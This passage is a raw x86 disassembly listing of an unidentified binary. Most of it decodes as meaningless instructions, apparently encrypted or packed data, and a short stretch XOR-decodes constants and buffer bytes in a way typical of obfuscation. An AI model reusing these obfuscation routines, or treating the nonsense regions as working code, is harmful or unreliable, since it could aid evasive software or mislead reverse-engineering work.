  409389:	pop    eax
  40938a:	mov    al,0x3b
  40938c:	mov    ecx,0x510383f9
  409391:	mov    ds:0xdb390f14,eax
  409396:	sub    BYTE PTR [eax+0xb],cl
  409399:	test   DWORD PTR [esi],esi
  40939b:	sub    cl,cl
  40939d:	xor    dl,0x7d
  4093a0:	push   cs
  4093a1:	or     DWORD PTR [ebp-0x2a],eax
  4093a4:	push   eax
  4093a5:	cmp    al,bl
  4093a7:	arpl   WORD PTR [ecx+eiz*2-0x79af2dcc],cx
  4093ae:	jle    0x409404
  4093b0:	jmp    0x3208:0xd8a70ede
  4093b7:	ins    BYTE PTR es:[edi],dx
  4093b8:	icebp  
  4093b9:	sbb    eax,0x7125bd8f
  4093be:	lods   eax,DWORD PTR ds:[esi]
  4093bf:	jnp    0x40936b
  4093c1:	not    ebx
  4093c3:	adc    DWORD PTR [eax-0x17],edi
  4093c6:	sub    BYTE PTR [esi],bh
  4093c8:	out    0x4a,al
  4093ca:	fcomp  QWORD PTR [ebx-0x74db2d24]
  4093d0:	inc    edi
  4093d1:	mov    ebp,0xce7667f0
  4093d6:	pop    ebx
  4093d7:	dec    ebx
  4093d8:	xchg   esp,eax
  4093d9:	iret   
  4093da:	test   ah,ah
  4093dc:	sahf   
  4093dd:	add    al,0xf0
  4093df:	push   cs
  4093e0:	mov    ah,0x94
  4093e2:	jl     0x40943f
  4093e4:	cmp    DWORD PTR [edi-0x44],0x73d33151
  4093eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ec:	push   es
  4093ed:	push   ss
  4093ee:	stc    
  4093ef:	sub    DWORD PTR [ebx+edx*2-0x32],ebx
  4093f3:	lea    ebp,[edi+ecx*2-0x7a30466b]
  4093fa:	push   ds
  4093fb:	(bad)  
  4093fc:	xchg   ecx,eax
  4093fd:	mul    DWORD PTR [edx+esi*2]
  409400:	sahf   
  409401:	in     al,dx
  409402:	jbe    0x4093b7
  409404:	outs   dx,BYTE PTR ds:[esi]
  409405:	add    ebp,DWORD PTR [ebx-0x52c9143c]
  40940b:	adc    DWORD PTR [esi],0xffffff98
  40940e:	out    dx,al
  40940f:	pop    ecx
  409410:	add    esp,ebp
  409412:	test   al,0x46
  409414:	shl    DWORD PTR [eax+0x63ba53f9],1
  40941a:	mov    ebx,0xc5435a87
  40941f:	fimul  WORD PTR [edx+0x553c6d93]
  409425:	pop    ds
  409426:	pop    es
  409427:	lds    ebp,FWORD PTR [esi+0x78]
  40942a:	mov    edi,0x3d837a81
  40942f:	or     DWORD PTR [ebx-0xa],edi
  409432:	jg     0x409464
  409434:	imul   eax,DWORD PTR ds:0x6d67ca68,0x57adf639
  40943e:	add    al,BYTE PTR [edi]
  409440:	icebp  
  409441:	imul   eax,ebp,0xb5933d61
  409447:	xor    dh,BYTE PTR [ebp-0x18]
  40944a:	dec    ecx
  40944b:	mov    al,ds:0x3c514c0c
  409450:	mov    ebx,0x7d18a36c
  409455:	push   eax
  409456:	mov    ch,BYTE PTR [ebx+0x20]
  409459:	inc    ebp
  40945a:	pop    ds
  40945b:	lahf   
  40945c:	mov    sp,0x6839
  409460:	ret    0x1ac5
  409463:	mov    bh,0x26
  409465:	or     BYTE PTR [esi-0x106efbef],ch
  40946b:	push   esi
  40946c:	aaa    
  40946d:	aad    0x13
  40946f:	pop    edx
  409470:	xor    DWORD PTR ss:[edi+0x7e],0xffffff86
  409475:	fs hlt 
  409477:	dec    esp
  409478:	mov    ch,0x27
  40947a:	mov    ah,0x7c
  40947c:	aad    0x98
  40947e:	fnstsw WORD PTR [ebx+0x28b24aba]
  409484:	inc    eax
  409486:	jae    0x409477
  409488:	cmp    edi,ecx
  40948a:	in     eax,0x8d
  40948c:	cmp    DWORD PTR [edi+0x37],ecx
  40948f:	sub    ebx,ebx
  409491:	loopne 0x4094ee
  409493:	mov    es,WORD PTR [eax+0x1f]
  409496:	aaa    
  409497:	mov    ch,0xd9
  409499:	cs jmp 0x1557622c
  40949f:	sub    eax,0x6e4c16f1
  4094a4:	retf   0x11
  4094a7:	rol    ecx,1
  4094a9:	push   ds
  4094aa:	ins    DWORD PTR es:[edi],dx
  4094ab:	adc    dh,BYTE PTR ds:0x2ff8a32d
  4094b1:	inc    eax
  4094b2:	add    DWORD PTR [eax+0x71],eax
  4094b5:	out    0x64,eax
  4094b7:	xlat   BYTE PTR ds:[ebx]
  4094b8:	mov    fs,WORD PTR [ebx-0x3b]
  4094bb:	mov    edi,0x5f8cde24
  4094c0:	jmp    0x40947b
  4094c2:	or     BYTE PTR [esi+0x699b3891],cl
  4094c8:	pop    edi
  4094c9:	inc    ecx
  4094ca:	pop    ds
  4094cb:	push   edi
  4094cc:	adc    edi,DWORD PTR [ecx+0x21]
  4094cf:	jmp    0x6aa6:0xf9ac4d6e
  4094d6:	out    0x83,al
  4094d8:	jecxz  0x4094d0
  4094da:	xlat   BYTE PTR ds:[ebx]
  4094db:	in     eax,0x6e
  4094dd:	jg     0x4094a0
  4094df:	scas   al,BYTE PTR es:[edi]
  4094e0:	jge    0x4094f9
  4094e2:	jbe    0x409479
  4094e4:	outs   dx,BYTE PTR ds:[esi]
  4094e5:	dec    ebx
  4094e6:	(bad)  
  4094e7:	adc    DWORD PTR [edi-0x289065e2],ebx
  4094ed:	pop    ds
  4094ee:	hlt    
  4094ef:	sub    ecx,DWORD PTR ds:0xaf8f4493
  4094f5:	pusha  
  4094f6:	retf   
  4094f7:	arpl   WORD PTR [ecx],cx
  4094f9:	add    edx,DWORD PTR [esi+0xab51375]
  4094ff:	jmp    0x409560
  409501:	lea    esi,[ebx+0x40]
  409504:	fxch   st(5)
  409506:	push   esp
  409507:	sub    al,0xf9
  409509:	ds pop edi
  40950b:	adc    DWORD PTR ds:0xae846b69,eax
  409511:	adc    DWORD PTR [ebp-0x32],ecx
  409514:	cmovg  eax,ebp
  409517:	jbe    0x4094da
  409519:	(bad)  
  40951a:	fld    TBYTE PTR [ebp-0x13dadd29]
  409520:	(bad)  
  409521:	js     0x40958c
  409523:	xchg   ecx,eax
  409524:	xor    BYTE PTR [ecx-0x43dc6686],0xa7
  40952b:	lds    ebx,FWORD PTR [esi]
  40952d:	enter  0x62e2,0xb7
  409531:	in     al,dx
  409532:	mov    edx,ss
  409534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409535:	in     eax,0x7b
  409537:	call   0x191c3d45
  40953c:	lds    ecx,FWORD PTR [edx+edi*1+0x6da8e2f3]
  409543:	loope  0x409578
  409545:	and    eax,DWORD PTR [edi-0x2b9740c3]
  40954b:	pop    ebp
  40954c:	dec    eax
  40954d:	int    0xad
  40954f:	mov    ebp,0x7ee9b58b
  409554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409555:	xchg   esp,eax
  409556:	push   ebx
  409557:	push   esi
  409558:	out    dx,eax
  409559:	dec    edi
  40955a:	loop   0x409596
  40955c:	sub    edi,esp
  40955e:	mov    ch,0xf8
  409560:	mov    al,0x6c
  409562:	jecxz  0x409535
  409564:	pop    edi
  409565:	std    
  409566:	mov    ecx,0x2c1ce711
  40956b:	sti    
  40956c:	pop    edi
  40956d:	idiv   BYTE PTR [ebp+0x46]
  409570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409571:	test   al,dl
  409573:	xor    bh,0x21
  409576:	idiv   BYTE PTR ds:0x56ddbb0c
  40957c:	shl    bh,0x17
  40957f:	cmp    DWORD PTR [ecx+esi*2-0x4e65eecb],esi
  409586:	test   BYTE PTR [edx+0x176888c1],bl
  40958c:	and    BYTE PTR [eax+0x7c30a207],ah
  409592:	jmp    0x99cd:0xe9a12955
  409599:	adc    eax,0x8b668fd
  40959e:	imul   edx,DWORD PTR [edi],0x5c9abc2f
  4095a4:	sub    ch,BYTE PTR [eax+0x16]
  4095a7:	sub    DWORD PTR [eax+0x6b],0x5fef2a4e
  4095ae:	hlt    
  4095af:	cli    
  4095b0:	call   0x430e0174
  4095b5:	iret   
  4095b6:	or     al,BYTE PTR [ebx]
  4095b8:	jmp    0x90d6:0xebbfa733
  4095bf:	jl     0x4095ea
  4095c1:	cmp    DWORD PTR [ecx+0x4c],edx
  4095c4:	xor    edx,DWORD PTR [ecx-0x75]
  4095c7:	mov    WORD PTR ds:0xc4f7c6ae,gs
  4095cd:	push   ecx
  4095ce:	fdiv   st(0),st
  4095d0:	outs   dx,BYTE PTR ds:[esi]
  4095d1:	sub    al,BYTE PTR [edi]
  4095d3:	out    dx,eax
  4095d4:	mov    al,0xf0
  4095d6:	lea    ecx,[esi+0x11]
  4095d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095da:	add    DWORD PTR [ebx-0x75],0x3a
  4095de:	push   ebp
  4095df:	jmp    0x1fdd:0xdf6fa664
  4095e6:	or     ecx,edi
  4095e8:	mov    ?,WORD PTR [eax-0x1819a395]
  4095ee:	stc    
  4095ef:	les    esp,FWORD PTR [edi]
  4095f1:	ret    0x7f94
  4095f4:	cs adc eax,0x4d883014
  4095fa:	mov    ds:0xee99c750,eax
  4095ff:	sub    DWORD PTR [edx-0x411adfcd],esi
  409605:	mov    ecx,0x489455e9
  40960a:	jmp    0xdcdc:0x9f73490e
  409611:	jecxz  0x409656
  409613:	dec    esp
  409614:	sbb    al,0x89
  409616:	and    DWORD PTR [esi],edi
  409618:	sub    cl,0x5a
  40961b:	inc    edi
  40961d:	mov    ds:0x23c36bac,eax
  409622:	or     al,0xc1
  409624:	data16 das 
  409626:	sub    al,0x9c
  409628:	sbb    BYTE PTR [ebx-0x3ee974b9],cl
  40962e:	loopne 0x409632
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422548
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x20bca5c6
  4097de:	jnp    0x409829
  4097e0:	push   0x47
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [edi-0x2a],bl
  4097eb:	retf   0x1e26
  4097ee:	leave  
  4097ef:	mov    edi,0x687a2a0d
  4097f4:	adc    BYTE PTR [edi+edi*8-0x5fa308cf],al
  4097fb:	pop    ebx
  4097fc:	popa   
  4097fd:	xchg   DWORD PTR [edi-0x6],esp
  409800:	xchg   ebx,eax
  409801:	jne    0x40985c
  409803:	pop    esi
  409805:	pusha  
  409806:	retf   
  409807:	xor    edx,esp
  409809:	popa   
  40980a:	jge    0x40986b
  40980c:	xor    al,0x69
  40980e:	push   ebp
  40980f:	mov    al,0x6d
  409811:	fst    st(2)
  409813:	xlat   BYTE PTR ds:[ebx]
  409814:	stc    
  409815:	jo     0x409896
  409817:	dec    ecx
  409818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409819:	cmp    al,0x18
  40981b:	push   ebp
  40981c:	jp     0x409845
  40981e:	mov    ebp,0xe48a431b
  409823:	stc    
  409824:	sub    edi,edi
  409826:	mov    edx,0x67541ead
  40982b:	mov    dh,0xa3
  40982d:	sbb    esp,DWORD PTR [ebx-0x4c1f04e7]
  409833:	test   BYTE PTR [ebp-0x39],ah
  409836:	pusha  
  409837:	adc    BYTE PTR [esi-0x48],dh
  40983a:	shl    al,1
  40983c:	cmp    ah,BYTE PTR [edx+0x6f]
  40983f:	es test eax,0xe88fa54b
  409845:	or     eax,0x5b0aec2
  40984a:	test   al,0x29
  40984c:	push   ecx
  40984d:	shl    BYTE PTR [eax],1
  40984f:	mov    ebx,0x37f6a47d
  409854:	repz std 
  409856:	sub    BYTE PTR [esi+ebx*8+0x6a758c16],0x6c
  40985e:	ja     0x4098dc
  409860:	and    bl,ch
  409862:	in     eax,0xad
  409864:	cdq    
  409865:	adc    edx,esp
  409867:	xor    DWORD PTR [eiz*1-0x56865448],esp
  40986e:	clc    
  40986f:	xor    eax,0x9dd80a9c
  409874:	xor    al,0xea
  409876:	idiv   BYTE PTR [eax+esi*2]
  409879:	xor    cl,BYTE PTR [ebx+edx*4]
  40987c:	xchg   esi,eax
  40987d:	cmp    DWORD PTR [ecx],ebx
  40987f:	push   esi
  409880:	mov    eax,ds:0x571353
  409885:	mov    ch,0x76
  409887:	mov    eax,0xc317eb5e
  40988c:	add    BYTE PTR [esp+ebx*8+0x6e],dl
  409890:	and    eax,0xb86e5ecc
  409895:	das    
  409896:	retf   0xbc6b
  409899:	adc    DWORD PTR [edi-0x2d],esp
  40989c:	jae    0x4098b3
  40989e:	jmp    0x16c0028a
  4098a3:	add    cl,BYTE PTR [eax]
  4098a5:	sbb    dl,BYTE PTR [edx]
  4098a7:	jnp    0x4098c4
  4098a9:	clc    
  4098aa:	mov    bh,0xe6
  4098ac:	test   ch,0x7
  4098af:	push   cs
  4098b0:	out    dx,al
  4098b1:	adc    BYTE PTR [ebp+0xa],ah
  4098b4:	jnp    0x409912
  4098b6:	cmp    eax,edx
  4098b8:	mov    eax,ds:0xcb8ca374
  4098bd:	std    
  4098be:	popf   
  4098bf:	sub    al,0xcc
  4098c1:	jo     0x4098f7
  4098c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098c4:	jl     0x4098d6
  4098c6:	cs out 0x3e,al
  4098c9:	pop    ebx
  4098ca:	int3   
  4098cb:	jmp    0xabda:0xba7c6eda
  4098d2:	sub    al,0x1d
  4098d4:	sub    eax,0x2b7f346e
  4098d9:	mov    al,ds:0xd2b56566
  4098de:	push   ds
  4098df:	jl     0x409933
  4098e1:	inc    esp
  4098e2:	jle    0x40987e
  4098e4:	add    esi,DWORD PTR [esi]
  4098e6:	xchg   ebp,eax
  4098e7:	enter  0x48f8,0xef
  4098eb:	sbb    al,0xbb
  4098ed:	xchg   ecx,eax
  4098ee:	les    ebx,FWORD PTR [esi-0x69]
  4098f1:	mov    al,0x89
  4098f3:	push   ebp
  4098f4:	mov    ecx,DWORD PTR [ecx-0x9924f92]
  4098fa:	xchg   ebx,eax
  4098fb:	mov    eax,DWORD PTR [ecx+0x22bd41f0]
  409901:	icebp  
  409902:	aad    0xda
  409904:	in     al,0xc5
  409906:	push   es
  409907:	stc    
  409908:	sub    bl,bh
  40990a:	push   ss
  40990b:	mov    ch,BYTE PTR [ebx]
  40990d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40990e:	(bad)  
  40990f:	cmp    ebp,DWORD PTR [edx]
  409911:	retf   
  409912:	add    edx,DWORD PTR [ecx]
  409914:	pusha  
  409915:	sar    BYTE PTR [bp+0x44],0x35
  40991a:	(bad)  [esi]
  40991c:	ins    DWORD PTR es:[edi],dx
  40991d:	pop    edi
  40991e:	add    ah,dl
  409920:	mov    eax,0x27e48ff0
  409925:	mov    al,ds:0x4bcc0298
  40992a:	xor    eax,0x3f4edb69
  40992f:	test   DWORD PTR [ecx-0x1f],0xf4a12ebe
  409936:	pop    ss
  409937:	sub    DWORD PTR [ebx],esp
  409939:	call   0x6c3d:0x88205dd5
  409940:	popa   
  409941:	mov    edx,0x907a042b
  409946:	mov    ds:0xd13b0784,al
  40994b:	jle    0x4099be
  40994d:	inc    edi
  40994e:	aaa    
  40994f:	imul   esp,DWORD PTR [edx+0x40],0x5c640040
  409956:	fs sub ebp,ebx
  409959:	push   ebx
  40995a:	scas   al,BYTE PTR es:[edi]
  40995b:	dec    ebx
  40995c:	imul   esp,DWORD PTR [ebx-0x28],0xffffffdf
  409960:	jno    0x409900
  409962:	(bad)  
  409963:	idiv   DWORD PTR [esi+0x28]
  409966:	lods   eax,DWORD PTR ds:[esi]
  409967:	addr16 (bad) 
  409969:	dec    ebx
  40996a:	aas    
  40996b:	adc    edi,DWORD PTR [edi]
  40996d:	js     0x4099d8
  40996f:	stc    
  409970:	imul   esp,DWORD PTR [ecx-0x6d],0x26
  409974:	xchg   esp,eax
  409975:	mov    fs,WORD PTR [edi+0x5a513b8e]
  40997b:	mov    ch,0x1b
  40997d:	gs xchg ecx,eax
  40997f:	pop    ebp
  409980:	jns    0x4099cc
  409982:	aam    0x76
  409984:	add    eax,0xc7690424
  409989:	inc    esi
  40998a:	and    edi,DWORD PTR [eax+edi*2]
  40998d:	std    
  40998e:	cwde   
  40998f:	xchg   edx,eax
  409990:	mov    cl,0x36
  409992:	mov    ecx,0xd7cd954
  409997:	and    DWORD PTR [esi],0xb5de98f9
  40999d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40999e:	mov    fs,ebp
  4099a0:	sar    BYTE PTR [edx+0x54],cl
  4099a3:	loop   0x409972
  4099a5:	jecxz  0x4099c2
  4099a7:	push   ebp
  4099a8:	lods   eax,DWORD PTR ds:[esi]
  4099a9:	int    0x8a
  4099ab:	in     eax,dx
  4099ac:	add    DWORD PTR [edi-0x64],ebp
  4099af:	sub    BYTE PTR [ecx],dl
  4099b1:	sar    BYTE PTR [eax+0xc028a8e],1
  4099b7:	mov    ecx,0xf1f449e8
  4099bc:	push   edx
  4099bd:	je     0x4099ab
  4099bf:	shl    BYTE PTR [edi-0x3c078ff1],1
  4099c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099c6:	or     ecx,DWORD PTR [eax]
  4099c8:	stos   DWORD PTR es:[edi],eax
  4099c9:	push   0x28
  4099cb:	imul   esi,DWORD PTR [edi],0xf9ed6d35
  4099d1:	push   ds
  4099d2:	jmp    0x79f136df
  4099d7:	dec    ebx
  4099d8:	enter  0xb49b,0xc1
  4099dc:	sbb    bh,BYTE PTR [edi]
  4099de:	or     DWORD PTR [ebx+edx*8-0x2abe1e74],eax
  4099e5:	jno    0x409a63
  4099e7:	pop    esp
  4099e8:	inc    edx
  4099e9:	loopne 0x409a5e
  4099eb:	sbb    BYTE PTR [ecx+esi*1+0xe],dh
  4099ef:	test   al,0xa3
  4099f1:	pop    ebp
  4099f2:	rol    edi,1
  4099f4:	outs   dx,BYTE PTR ds:[esi]
  4099f5:	jge    0x409a0b
  4099f7:	inc    esp
  4099f8:	or     eax,0x7618cbf6
  4099fd:	jo     0x4099c8
  4099ff:	add    edx,ebp
  409a01:	cmp    eax,esi
  409a03:	aaa    
  409a04:	in     eax,0xb6
  409a06:	das    
  409a07:	xchg   ecx,eax
  409a08:	mov    eax,0xec37d269
  409a0d:	mov    al,BYTE PTR [edi-0x14aae535]
  409a13:	mov    ebx,DWORD PTR [edx-0x35]
  409a16:	daa    
  409a17:	xchg   edx,eax
  409a18:	stc    
  409a19:	scas   eax,DWORD PTR es:[edi]
  409a1a:	dec    esi
  409a1b:	cmc    
  409a1c:	imul   esi,DWORD PTR [eax-0x189ed3e1],0x6a5369ff
  409a26:	adc    ch,BYTE PTR [esi]
  409a28:	jmp    0x68a4d555
  409a2d:	cdq    
  409a2e:	push   ebp
  409a2f:	push   eax
  409a30:	push   cs
  409a31:	xchg   edi,eax
  409a32:	mov    edi,DWORD PTR [esi+ecx*2]
  409a35:	daa    
  409a36:	sub    eax,0x2536678c
  409a3b:	in     eax,0xdc
  409a3d:	adc    eax,DWORD PTR [edi+0x66ee3238]
  409a43:	mov    edi,DWORD PTR [esi-0x43bec806]
  409a49:	add    bh,BYTE PTR [ebp+0x174f8a30]
  409a4f:	in     eax,dx
  409a50:	dec    edi
  409a51:	add    ah,BYTE PTR [ecx]
  409a53:	addr16 into 
  409a55:	rol    edx,cl
  409a57:	mov    esi,0x820457d6
  409a5c:	push   0xffffffff
  409a5e:	clc    
  409a5f:	jmp    DWORD PTR [ecx]
  409a61:	add    eax,0x4d424ebb
  409a66:	dec    esi
  409a67:	dec    esi
  409a68:	pop    es
  409a69:	int3   
  409a6a:	pop    ebx
  409a6b:	xor    eax,0xfe0bb805
  409a70:	std    
  409a71:	push   cs
  409a72:	jg     0x409a01
  409a74:	inc    esi
  409a75:	jbe    0x409a7d
  409a77:	mov    esp,0xc355eddd
  409a7c:	jecxz  0x409a88
  409a7e:	(bad)  
  409a7f:	fsubp  st(7),st
  409a81:	stos   DWORD PTR es:[edi],eax
  409a82:	xchg   DWORD PTR [ebx-0x1b],ecx
  409a85:	into   
  409a86:	enter  0xb859,0xd3
  409a8a:	fstp   DWORD PTR [edx+0x7e]
  409a8d:	xchg   ebx,eax
  409a8e:	jg     0x409a30
  409a90:	stc    
  409a91:	inc    eax
  409a92:	or     BYTE PTR [ebp-0x44],cl
  409a95:	sub    BYTE PTR [eax-0x56],ch
  409a98:	adc    ch,ah
  409a9a:	sbb    cl,BYTE PTR [ebp+0x2488be0]
  409aa0:	loop   0x409aeb
  409aa2:	ins    BYTE PTR es:[edi],dx
  409aa3:	jmp    0xb5df:0xef33138c
  409aaa:	in     eax,dx
  409aab:	or     dh,BYTE PTR [edi+0x254a9a60]
  409ab1:	sbb    eax,0x7c813dac
  409ab6:	xor    DWORD PTR [esi+0x7176493c],edi
  409abc:	(bad)  [edx]
  409abe:	lods   al,BYTE PTR ds:[esi]
  409abf:	inc    edx
  409ac0:	adc    DWORD PTR [esp+ebx*4],ebp
  409ac3:	test   BYTE PTR [esi],0x56
  409ac6:	sbb    eax,0xaf3fac2d
  409acb:	sub    eax,0x3257547a
  409ad0:	mov    DWORD PTR [ecx+ebp*1],eax
  409ad3:	jb     0x409a7f
  409ad5:	mov    esp,0x2df28ae2
  409ada:	xor    ch,BYTE PTR [edi]
  409adc:	popf   
  409add:	test   DWORD PTR [eax+0x57],0x36927327
  409ae4:	push   ss
  409ae5:	lea    edx,[edx+0x49ed117e]
  409aeb:	inc    ecx
  409aec:	dec    ecx
  409aed:	push   ss
  409aee:	out    dx,eax
  409aef:	stos   BYTE PTR es:[edi],al
  409af0:	sub    edi,DWORD PTR [ebx]
  409af2:	add    eax,esp
  409af4:	xor    BYTE PTR [eax],bl
  409af6:	sar    BYTE PTR [edx+0x600689ab],1
  409afc:	(bad)  [ebx+0x71f9c8ed]
  409b02:	mov    ebx,0x6355f47a
  409b07:	in     eax,dx
  409b08:	xchg   esp,eax
  409b09:	retf   0x6b01
  409b0c:	mov    dh,0x17
  409b0e:	cmc    
  409b0f:	jne    0x409add
  409b11:	out    dx,eax
  409b12:	cld    
  409b13:	xor    edi,0xffffff84
  409b16:	jo     0x409ab3
  409b18:	test   ebp,0xee6f28f3
  409b1e:	cwde   
  409b1f:	cs cmp eax,0xfffffff4
  409b23:	je     0x409af8
  409b25:	(bad)  
  409b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b28:	push   0x92a9a120
  409b2d:	mov    ebx,0xb23501ef
  409b32:	dec    ecx
  409b33:	add    DWORD PTR [ebx],edi
  409b35:	cmc    
  409b36:	enter  0xe3c0,0xa8
  409b3a:	adc    DWORD PTR [edx-0x21],edx
  409b3d:	fdiv   DWORD PTR [ebx]
  409b3f:	jne    0x409b16
  409b41:	adc    ebp,DWORD PTR [esi-0x27]
  409b44:	inc    esi
  409b45:	pop    ebp
  409b46:	loopne 0x409b6a
  409b48:	jl     0x409b03
  409b4a:	push   ebx
  409b4b:	test   eax,0x9a3e1b43
  409b50:	add    bl,bh
  409b52:	clc    
  409b53:	or     BYTE PTR [edi],ch
  409b55:	jp     0x409aeb
  409b57:	inc    esp
  409b58:	add    al,0x8a
  409b5a:	mov    ebp,0xd9d7da46
  409b5f:	sbb    eax,0xde9e4e54
  409b64:	(bad)  
  409b65:	je     0x409b1a
  409b67:	test   DWORD PTR [ebp-0x6e],0xecfe745
  409b6e:	imul   esp,DWORD PTR [ebx+0x3b],0x6
  409b72:	xchg   esi,eax
  409b73:	adc    cl,cl
  409b75:	sub    DWORD PTR ds:0x2ba0d72d,0xf8cd9cbe
  409b7f:	xor    bl,dl
  409b81:	push   ebx
  409b82:	or     ecx,DWORD PTR [edx-0x3b8fbfc8]
  409b88:	test   DWORD PTR [eax+ebp*1+0x381321a2],ebp
  409b8f:	pop    esi
  409b90:	inc    edi
  409b91:	mov    WORD PTR [edi-0x7af97a1e],ss
  409b97:	ja     0x409c0b
